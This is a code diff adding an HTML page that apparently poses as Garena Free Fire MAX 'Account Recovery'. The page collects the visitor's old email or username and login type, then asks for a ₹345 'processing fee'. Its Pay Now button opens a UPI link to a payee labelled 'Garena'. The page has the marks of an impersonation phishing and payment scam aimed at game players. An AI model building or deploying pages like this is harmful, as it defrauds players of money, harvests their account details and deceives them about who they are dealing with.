@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Account Recovery</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+  <h2>Account Recovery (MAX)</h2>
+
+  <form action="process.php" method="post">
+    <input type="hidden" name="type" value="recovery">
+
+    <select name="method" required>
+      <option value="">Select Login Type</option>
+      <option>Google</option>
+      <option>Facebook</option>
+      <option>Guest</option>
+    </select>
+
+    <input type="text" name="old_id" placeholder="Old Email / Username" required>
+
+    <button type="submit">Continue</button>
+  </form>
+
+  <p class="fee">Processing Fee ₹345</p>
+  <button onclick="pay()">Pay Now</button>
+</div>
+
+<script>
+function pay(){
+  window.location.href =
+   "upi://pay?pa=garenafreefiremax@jkb&pn=Garena&am=345&cu=INR&tn=accountRecovery";
+}
+</script>
+
+</body>
+</html>
